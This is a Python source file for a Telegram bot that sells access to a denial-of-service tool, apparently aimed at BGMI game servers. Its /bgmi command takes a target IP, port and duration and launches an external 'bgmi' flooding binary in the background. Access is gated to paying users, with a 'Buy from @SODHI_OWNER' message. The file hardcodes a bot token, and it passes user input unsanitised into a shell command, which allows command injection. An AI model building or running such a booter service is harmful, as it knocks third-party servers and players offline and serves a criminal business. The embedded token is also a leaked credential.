#bgmiddoserpython

import telebot
import subprocess
import datetime
import os
import time
import requests
import random

# Railway setup: keep_alive handles the port binding for web services
try:
    from keep_alive import keep_alive
    keep_alive()
except ImportError:
    pass

# Bot Token and Admin ID
TOKEN = '8749691844:AAHGRQZ-Y6IoWeX-Ir82deDexj2u5TcNkao'
bot = telebot.TeleBot(TOKEN)
admin_id = ["8787952549"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Ensure files exist
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f: f.write("")
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f: f.write("")

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except:
        return []

allowed_user_ids = read_users()

# --- Handlers ---

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            uid = cmd[1]
            if uid not in allowed_user_ids:
                allowed_user_ids.append(uid)
                with open(USER_FILE, "a") as f: f.write(f"{uid}\n")
                bot.send_message(message.chat.id, f"✅ User {uid} Added!")
            else:
                bot.send_message(message.chat.id, "❌ User already exists.")
    else:
        bot.send_message(message.chat.id, "❌ Admin only command.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        cmd = message.text.split()
        if len(cmd) == 4:
            target, port, duration = cmd[1], cmd[2], cmd[3]
            bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s")
            try:
                os.system("chmod +x bgmi")
                full_command = f"./bgmi {target} {port} {duration} 500"
                subprocess.Popen(full_command, shell=True) # Non-blocking to avoid bot freezing
                bot.send_message(message.chat.id, "✅ Attack running in background.")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        else:
            bot.send_message(message.chat.id, "📝 Usage: /bgmi <ip> <port> <time>")
    else:
        bot.send_message(message.chat.id, "🚫 No Access! Buy from @SODHI_OWNER")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!")

# --- Polling Logic with Force Termination ---
def run_bot():
    print("Railway Instance Manager Starting...")
    
    # Random delay 5-15 seconds to prevent race condition between old and new container
    wait_time = random.randint(5, 15)
    print(f"Waiting {wait_time}s to allow previous instance to shut down...")
    time.sleep(wait_time)

    # Forcefully clear webhook and drop all pending updates that cause loops
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true")
        print("Telegram Session Reset: Success")
    except Exception as e:
        print(f"Session Reset Warning: {e}")

    while True:
        try:
            print("Starting Bot Polling...")
            # Interval added to keep the CPU usage and request rate steady
            bot.polling(none_stop=True, skip_pending=True, interval=3, timeout=60)
        except Exception as e:
            error_str = str(e)
            print(f"Polling Error: {error_str}")
            
            if "Conflict" in error_str or "409" in error_str:
                # If conflict happens, wait longer to let Railway kill the ghost process
                print("CONFLICT: Waiting 25s for session expiry...")
                time.sleep(25)
            else:
                time.sleep(10)

if __name__ == "__main__":
    run_bot()
